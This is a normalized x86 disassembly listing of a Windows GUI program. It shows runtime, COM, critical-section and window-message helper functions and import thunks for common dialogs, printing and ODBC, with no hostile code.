call sub_4437b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_426518
push esi
mov esi ecx
call sub_42652c
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
pop esi
retn
sub_42661c
mov eax [ esp + 0x4 ]
test eax eax
jge r-xdata
retn 0x4
cmp eax 0x8007000e
jne r-xdata
push eax
call sub_45663d
call sub_43b7b5
jmp r-xdata
sub_426793
push 0x10
push 0x0
push [ esp + 0xc ]
call sub_42dc30
add esp 0xc
retn 0x4
sub_426968
push ecx
call [ VariantClear@IAT ]
retn
sub_426970
mov eax ecx
mov ecx [ esp + 0x4 ]
movsx edx cx
shr ecx 0x10
movsx ecx cx
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
retn 0x4
j_sub_43e71a
jmp sub_43e71a
sub_42698c
call sub_43e71a
retn 0x4
sub_426994
call sub_43e71a
retn 0x8
sub_42699c
mov eax ecx
mov ecx [ rw-data ]
mov [ eax ] ecx
retn
sub_426bba
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x20 ]
call sub_442f87
mov [ ebp - 0x14 ] 0x80020009
mov eax r-xdata
retn
push [ ebp - 0x20 ]
push eax
call sub_45772a
sub_426cc3
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
sub_426d34
mov eax r--data
retn
sub_426d3a
mov eax r--data
retn
sub_426d9f
push esi
mov esi ecx
call sub_426dbb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_426f2f
mov ecx [ ebp - 0x1c ]
call sub_442f87
mov eax r-xdata
retn
sub_427380
push esi
mov esi ecx
call sub_42739c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_42739c
mov eax sub_464558
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4477b8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_42747e
mov eax [ ecx + 0x48 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
retn 0x4
and [ ecx + 0x48 ] 0x0
sub_4274f3
push ebp
mov ebp esp
mov eax [ ecx ]
lea edx [ ebp + 0x8 ]
push edx
push [ ebp + 0x8 ]
call [ eax + 0x6c ]
push [ ebp + 0x8 ]
call sub_43e7b3
pop ebp
retn 0x4
sub_4275f8
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0xc
push [ esp + 0xc ]
mov ecx eax
push [ esp + 0xc ]
call sub_4416fc
sub_427617
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x10
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
sub_427679
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x8
push [ esp + 0x8 ]
mov ecx eax
call sub_4416d5
sub_4276fe
mov ecx [ ebp - 0x14 ]
call sub_442f87
and [ ebp + 0x8 ] 0x0
mov eax r-xdata
retn
sub_427710
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x4c ]
call sub_456865
retn 0xc
sub_427727
mov eax [ esp + 0x4 ]
add eax 0xffffffb8
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_427738
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x4c ]
call sub_45671a
retn 0x4
sub_427747
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov eax [ eax - 0x30 ]
mov eax [ eax + 0x1c ]
mov [ ecx ] eax
xor eax eax
retn 0x8
sub_42775c
mov eax 0x80004001
retn 0x8
sub_42779b
mov eax 0x80004001
retn 0xc
sub_4277a3
mov eax 0x80004001
retn 0x10
sub_4277ab
xor eax eax
retn 0x8
sub_4277b0
mov eax r--data
retn
sub_42780c
push esi
mov esi ecx
call sub_4277b6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_427846
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0x50 ]
call sub_456865
retn 0xc
sub_42785d
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x50 ]
call sub_45671a
retn 0x4
sub_42786c
mov eax [ esp + 0x4 ]
add eax 0xffffffb4
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_42787d
mov eax 0x80004001
retn 0x14
sub_42793e
mov [ ebp - 0x18 ] 0x8007000e
mov eax sub_42794b
retn
sub_427993
push 0x0
push 0x0
push 0x31
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
push eax
call sub_44774c
retn
sub_4279a9
mov eax r--data
retn
sub_427ab6
push esi
mov esi ecx
call sub_427ad2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_4284d6
test [ ecx + 0x71 ] 0x10
je r-xdata
xor eax eax
push 0x1
pop eax
test [ ecx + 0x6c ] al
jne r-xdata
retn
sub_4284e7
test [ ecx + 0x71 ] 0x10
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x6c ]
and al 0x1
neg al
sbb eax eax
and al 0xf0
add eax 0x20
retn
sub_428a97
push 0x0
mov eax [ ecx ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x2
push [ esp + 0x14 ]
push ecx
call [ eax + 0x60 ]
add esp 0x18
retn 0xc
sub_428ab3
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
push edx
push [ esp + 0x10 ]
mov eax [ ecx ]
push [ esp + 0x10 ]
call [ eax + 0x5c ]
retn
sub_428b0b
mov ecx [ ebp - 0x14 ]
call sub_442f87
and [ ebp + 0x10 ] 0x0
mov eax r-xdata
retn
sub_428b7c
mov ecx [ ebp - 0x20 ]
call sub_442f87
mov eax sub_428b8a
retn
sub_428bc5
mov ecx [ ebp - 0x20 ]
call sub_442f87
mov eax r-xdata
retn
sub_428c2d
mov ecx [ ebp - 0x1c ]
call sub_442f87
mov eax r-xdata
retn
sub_428d88
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] esp
call sub_442f87
mov ecx [ ebp - 0x14 ]
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ecx ]
push 0x8
push 0xfffffdfb
call [ eax + 0x64 ]
mov eax r-xdata
retn
sub_428daf
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
sub_428e5d
mov eax [ ecx + 0x28 ]
retn
sub_428e61
mov edx [ esp + 0x4 ]
mov eax [ ecx + 0x28 ]
mov [ ecx + 0x28 ] edx
retn 0x4
sub_42901c
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov eax r-xdata
retn
sub_42907e
mov ecx [ ebp - 0x18 ]
call sub_442f87
mov [ ebp - 0x14 ] 0x1
mov eax r-xdata
retn
sub_4292d8
mov eax [ esp + 0x4 ]
add eax 0xffffff4c
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_4292eb
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xb8 ]
call sub_45671a
retn 0x4
sub_4292fd
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xb8 ]
call sub_456865
retn 0xc
sub_429317
push [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
mov ecx [ eax - 0x9c ]
push r--data
call sub_456865
retn 0x8
sub_429332
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xb8 ]
call sub_4288fe
xor eax eax
retn 0x4
sub_429346
mov eax 0x80004001
retn 0x4
sub_42934e
mov eax [ esp + 0x4 ]
add eax 0xffffff48
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_429361
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xbc ]
call sub_45671a
retn 0x4
sub_429373
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xbc ]
call sub_456865
retn 0xc
sub_4293b8
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x5c ]
xor eax eax
retn 0x4
sub_429447
push 0x1
pop eax
retn 0xc
sub_42944d
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
call [ edx + 0x60 ]
xor eax eax
retn 0x8
sub_429464
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xbc ]
call sub_42893b
xor eax eax
retn 0x4
sub_429478
mov eax [ esp + 0x4 ]
mov eax [ eax - 0x6c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
retn 0x4
sub_4294dd
mov eax [ esp + 0x4 ]
add eax 0xffffff44
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_4294f0
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc0 ]
call sub_45671a
retn 0x4
sub_429502
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xc0 ]
call sub_456865
retn 0xc
sub_42951c
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc0 ]
call sub_42878f
xor eax eax
retn 0x4
sub_429632
mov eax [ esp + 0x4 ]
add eax 0xffffff40
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_429645
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xc4 ]
call sub_45671a
retn 0x4
sub_429657
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xc4 ]
call sub_456865
retn 0xc
sub_429671
mov eax 0x80004001
retn 0x18
sub_42a2f0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
add ecx 0x4
push ecx
push rw-data
push eax
call [ edx ]
sub_42a3e5
mov eax r-xdata
retn
sub_42a44a
mov eax r-xdata
retn
sub_42a53e
mov eax r-xdata
retn
sub_42a5e8
mov eax r-xdata
retn
sub_42b2e5
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
retn 0x4
sub_42be2b
push esi
mov esi ecx
push [ esi + 0xc ]
call sub_441eb2
push [ esi + 0x24 ]
call sub_441eb2
pop ecx
pop ecx
pop esi
retn
sub_42be8e
mov eax r-xdata
retn
sub_42bfa5
mov dx [ esp + 0xc ]
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] dx
mov edx [ esp + 0x8 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] ecx
retn 0xc
sub_42bfcb
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
retn 0x4
sub_42bfd4
mov eax [ esp + 0x4 ]
cmp [ ecx + 0xc ] eax
je r-xdata
retn 0x4
mov [ ecx + 0xc ] eax
call sub_42bfec
sub_42bfe8
mov eax [ ecx + 0x18 ]
retn
sub_42c0dc
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xd0 ]
call sub_456701
retn 0x4
sub_42c0ee
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0xd0 ]
call sub_456744
retn 0x4
sub_42c100
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push [ esp + 0xc ]
lea ecx [ eax - 0xd0 ]
call sub_4568a7
retn 0xc
sub_42c11a
push [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
push [ esp + 0x10 ]
lea ecx [ eax - 0xd0 ]
push [ esp + 0x10 ]
call sub_42c0a5
retn 0x10
sub_42c138
push 0x1
pop eax
retn 0x4
sub_42c1e4
push 0x2
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_42c345
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_42c24e
push 0x4
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_42c345
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_42c26e
push 0x5
mov ecx [ esp + 0x8 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_42c345
test eax eax
jl r-xdata
retn 0x10
xor eax eax
sub_42c678
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
j_sub_457a3c
jmp sub_457a3c
sub_42c6b3
mov eax ecx
mov ecx [ esp + 0x4 ]
or [ eax + 0x4 ] 0xffffffff
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
retn 0x4
sub_42d040
mov ecx [ ebp + 0xc ]
call sub_442f87
mov eax r-xdata
retn
sub_42d0a2
push esi
mov esi ecx
call sub_42d0be
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_42d0be
mov eax sub_464998
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0xc
call sub_442148
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_42d0ea
push esi
mov esi ecx
call sub_42d106
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_42d106
mov [ ecx ] r--data
retn
sub_42d17d
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_42d184
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_42d3ac
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42d450
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_42d4da
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_42d450
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_42d506
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_42d680
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_42d5fa
mov eax [ esp + 0x18 ]
add esp 0x10
retn
sub_42d719
push [ esp + 0x4 ]
call sub_42d69b
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_42d842
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_42d948
push rw-data
push rw-data
call sub_42d948
add esp 0x10
retn
call eax
sub_42d86f
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_42d891
add esp 0xc
retn
sub_42d880
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_42d891
add esp 0xc
retn
sub_42d936
push 0xd
call sub_430d2a
pop ecx
retn
sub_42d93f
push 0xd
call sub_430d8b
pop ecx
retn
sub_42d9a3
call sub_42d9bb
call sub_431b70
mov [ rw-data ] eax
call sub_431b20
fnclex
retn
sub_42d9ba
retn
sub_42d9bb
mov eax sub_431f49
mov [ rw-data ] sub_431bf3
mov [ rw-data ] eax
mov [ rw-data ] sub_431c59
mov [ rw-data ] sub_431b99
mov [ rw-data ] sub_431c41
mov [ rw-data ] eax
retn
sub_42dbc5
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_432ea1
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_432e68
sub_42dc12
push esi
mov esi ecx
call sub_42dbe9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_42dc88
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_42de41
push 0x9
call sub_430d8b
pop ecx
retn
sub_42dea0
push 0x9
call sub_430d8b
pop ecx
retn
sub_42df40
push 0x9
call sub_430d8b
pop ecx
retn
sub_42df98
push 0x9
call sub_430d8b
pop ecx
retn
sub_42e1ca
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42e1e2
sub_42e21e
push [ ebp - 0x14 ]
call sub_430704
pop ecx
retn
sub_42e2aa
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42e1e2
sub_42e859
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_42e870
add esp 0x10
retn
sub_42ea75
push 0x1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_42e870
add esp 0x10
retn
sub_42ee88
mov eax [ esp + 0x4 ]
push 0x0
movzx eax [ eax ]
test [ eax + rw-data ] 0x4
pop eax
setne al
inc eax
retn
sub_42f15e
push 0x1
push [ esp + 0x8 ]
call sub_42f16c
pop ecx
pop ecx
retn
sub_42f992
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_42f5ba
pop ecx
mov [ rw-data ] 0x1
sub_42fa6b
push 0x9
call sub_430d8b
pop ecx
retn
sub_42fb00
push 0x9
call sub_430d8b
pop ecx
retn
sub_42fba7
push 0x9
call sub_430d8b
pop ecx
retn
sub_42fc22
push 0x9
call sub_430d8b
pop ecx
retn
sub_42fcc4
push 0x9
call sub_430d8b
pop ecx
retn
sub_42fd4d
push 0x9
call sub_430d8b
pop ecx
retn
sub_42ffc2
push 0x9
call sub_430d8b
pop ecx
retn
sub_430110
push 0x9
call sub_430d8b
pop ecx
xor edi edi
retn
sub_4301eb
push 0x19
call sub_42dba0
pop ecx
retn
sub_4306cd
push [ ebp - 0x14 ]
call sub_430704
pop ecx
retn
sub_430704
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_430c4a
xor eax eax
retn
sub_43083a
push [ ebp - 0x14 ]
call sub_4308b0
pop ecx
retn
sub_430a92
push 0x1
pop eax
retn
sub_430a96
mov esp [ ebp - 0x18 ]
jmp sub_430c4a
sub_430af4
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_430afd
mov esp [ ebp - 0x18 ]
jmp sub_430c4a
sub_430bd0
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_430c92
push 0x1
pop eax
retn
sub_430ce8
push 0x1
pop eax
retn
sub_430d01
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_4318de
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_4318eb
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_4318fb
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_4319b1
call sub_432154
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_4354ee
sub_431b20
push 0x30000
push 0x10000
call sub_4355a4
pop ecx
pop ecx
retn
sub_431c41
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_432154
push 0x1
call sub_43215d
pop ecx
retn
sub_432e4d
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_42d472
add esp 0x8
pop ebp
retn 0x4
sub_43303a
push sub_432ff4
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_43304b
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_43463a
push 0x1
pop eax
retn
sub_4346ee
push 0x1
pop eax
retn
sub_434aa1
push 0x1
pop eax
retn
sub_434da6
push esi
push 0xb
call sub_430d2a
push [ esp + 0xc ]
call sub_434dc7
push 0xb
mov esi eax
call sub_430d8b
add esp 0xc
mov eax esi
pop esi
retn
sub_435280
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_43529c
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4352b8
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4355a4
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_43556f
pop ecx
pop ecx
retn
sub_435b75
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_435a09
add esp 0xc
retn
sub_435b8b
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_435a09
add esp 0xc
retn
sub_435d84
push 0x2
call sub_42dba0
pop ecx
retn
sub_435ead
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_435f62
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_435f73
add esp 0xc
retn
sub_43716f
push 0x1
pop eax
retn
sub_4371de
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
ReuseDDElParam
jmp [ ReuseDDElParam@IAT ]
UnpackDDElParam
jmp [ UnpackDDElParam@IAT ]
CommDlgExtendedError
jmp [ CommDlgExtendedError@IAT ]
PrintDlgA
jmp [ PrintDlgA@IAT ]
GetFileTitleA
jmp [ GetFileTitleA@IAT ]
GetSaveFileNameA
jmp [ GetSaveFileNameA@IAT ]
GetOpenFileNameA
jmp [ GetOpenFileNameA@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
Ordinal_oledlg_8
jmp [ Ordinal_oledlg_8@IAT ]
Ordinal_ODBC32_10
jmp [ Ordinal_ODBC32_10@IAT ]
Ordinal_ODBC32_5
jmp [ Ordinal_ODBC32_5@IAT ]
Ordinal_ODBC32_16
jmp [ Ordinal_ODBC32_16@IAT ]
Ordinal_ODBC32_13
jmp [ Ordinal_ODBC32_13@IAT ]
Ordinal_ODBC32_18
jmp [ Ordinal_ODBC32_18@IAT ]
Ordinal_ODBC32_11
jmp [ Ordinal_ODBC32_11@IAT ]
Ordinal_ODBC32_3
jmp [ Ordinal_ODBC32_3@IAT ]
Ordinal_ODBC32_14
jmp [ Ordinal_ODBC32_14@IAT ]
Ordinal_ODBC32_9
jmp [ Ordinal_ODBC32_9@IAT ]
Ordinal_ODBC32_15
jmp [ Ordinal_ODBC32_15@IAT ]
Ordinal_ODBC32_51
jmp [ Ordinal_ODBC32_51@IAT ]
Ordinal_ODBC32_45
jmp [ Ordinal_ODBC32_45@IAT ]
Ordinal_ODBC32_50
jmp [ Ordinal_ODBC32_50@IAT ]
Ordinal_ODBC32_1
jmp [ Ordinal_ODBC32_1@IAT ]
Ordinal_ODBC32_2
jmp [ Ordinal_ODBC32_2@IAT ]
Ordinal_ODBC32_41
jmp [ Ordinal_ODBC32_41@IAT ]
Ordinal_ODBC32_43
jmp [ Ordinal_ODBC32_43@IAT ]
Ordinal_ODBC32_68
jmp [ Ordinal_ODBC32_68@IAT ]
Ordinal_ODBC32_12
jmp [ Ordinal_ODBC32_12@IAT ]
Ordinal_ODBC32_46
jmp [ Ordinal_ODBC32_46@IAT ]
Ordinal_ODBC32_19
jmp [ Ordinal_ODBC32_19@IAT ]
Ordinal_ODBC32_44
jmp [ Ordinal_ODBC32_44@IAT ]
Ordinal_ODBC32_8
jmp [ Ordinal_ODBC32_8@IAT ]
Ordinal_ODBC32_59
jmp [ Ordinal_ODBC32_59@IAT ]
Ordinal_ODBC32_17
jmp [ Ordinal_ODBC32_17@IAT ]
Ordinal_ODBC32_20
jmp [ Ordinal_ODBC32_20@IAT ]
Ordinal_ODBC32_49
jmp [ Ordinal_ODBC32_49@IAT ]
Ordinal_ODBC32_48
jmp [ Ordinal_ODBC32_48@IAT ]
Ordinal_ODBC32_4
jmp [ Ordinal_ODBC32_4@IAT ]
Ordinal_ODBC32_72
jmp [ Ordinal_ODBC32_72@IAT ]
sub_4379b0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
xor ecx ecx
mov cx [ rw-data ]
push ecx
push eax
call [ GetPropA@IAT ]
retn
xor eax eax
retn
sub_4380b0
mov eax [ esp + 0x4 ]
push 0x0
push eax
call sub_4380c0
retn 0x4
sub_4382d0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0xffff
push eax
call sub_4395b0
add esp 0x10
retn 0x4
xor eax eax
retn 0x4
sub_4386d0
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x0
call sub_438d20
add esp 0x4
mov esi eax
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_4393d0
cmp [ rw-data ] 0x35f
jb r-xdata
mov eax [ esp + 0x8 ]
and eax 0xffffffdf
cmp ax 0x9
ja r-xdata
xor eax eax
retn
xor eax eax
retn
mov eax 0x1
retn
sub_43a7d0
mov eax [ esp + 0x10 ]
push 0x2
mov ecx [ esp + 0x10 ]
push eax
mov edx [ esp + 0x10 ]
push ecx
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_43a680
add esp 0x14
retn 0x10
sub_43aa30
mov eax [ esp + 0x10 ]
push 0x1
mov ecx [ esp + 0x10 ]
push eax
mov edx [ esp + 0x10 ]
push ecx
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_43a800
add esp 0x14
retn 0x10
sub_43ad26
or [ ecx ] ecx
pop es
or [ ecx ] ecx
or [ eax ] ecx
or [ eax ] cl
int3
sub_43b0e7
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4451dd
retn 0x10
sub_43b0ff
call sub_45357b
mov ecx [ esp + 0x4 ]
test ecx ecx
mov [ eax + 0x14 ] cl
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call sub_42f5ba
pop ecx
sub_43b11d
push 0x1
push 0x0
call sub_4552a3
call sub_45560e
jmp sub_4552bd
j_sub_43b135
jmp sub_43b135
sub_43b135
push 0x600
push 0x0
call sub_43b0ff
push sub_43b11d
call sub_42d719
pop ecx
mov [ rw-data ] al
retn
sub_43b246
push 0x0
push [ esp + 0x8 ]
call sub_43b254
retn 0x4
sub_43b7ce
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_42dca7
mov eax r--data
retn
sub_43b89f
push esi
mov esi ecx
call j_sub_43da87
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43b8bb
push esi
push 0x0
mov esi ecx
push 0x0
call sub_43ddd5
mov eax [ esp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x5c ] eax
mov eax esi
pop esi
retn 0x4
sub_43b988
push esi
mov esi ecx
mov eax [ esi + 0x5c ]
push [ eax + 0x8 ]
push [ eax + 0xc ]
call sub_43ba70
mov ecx [ esi + 0x5c ]
mov [ ecx + 0x10 ] eax
mov eax [ esi + 0x5c ]
pop esi
mov eax [ eax + 0x10 ]
retn
sub_43bc1d
push esi
mov esi ecx
call sub_45a115
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_441eb2
pop ecx
sub_43be24
xor eax eax
retn 0x4
sub_43be29
xor eax eax
retn
sub_43be2c
retn 0xc
sub_43be2f
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
push 0x0
mov ecx eax
